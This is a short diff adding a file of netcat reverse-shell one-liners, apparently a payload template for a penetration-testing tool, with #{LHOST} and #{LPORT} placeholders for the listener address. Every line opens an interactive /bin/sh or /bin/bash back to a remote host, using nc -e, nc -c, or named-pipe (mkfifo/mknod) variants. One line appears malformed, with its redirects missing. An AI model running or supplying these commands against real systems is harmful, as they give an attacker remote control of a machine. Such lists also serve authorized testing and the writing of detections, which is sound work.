@@ -1,0 +1,15 @@
+nc -e /bin/sh #{LHOST} #{LPORT}
+
+nc -e /bin/bash #{LHOST} #{LPORT}
+
+nc -c bash #{LHOST} #{LPORT}
+
+mknod backpipe p && nc #{LHOST} #{LPORT} 0<backpipe | /bin/bash 1>backpipe
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc #{LHOST} #{LPORT} >/tmp/f
+
+rm -f /tmp/p; mknod /tmp/p p && nc #{LHOST} #{LPORT} 0/tmp/p 2>&1
+
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc #{LHOST} #{LPORT} > f
+
+rm -f x; mknod x p && nc #{LHOST} #{LPORT} 0<x | /bin/bash 1>x
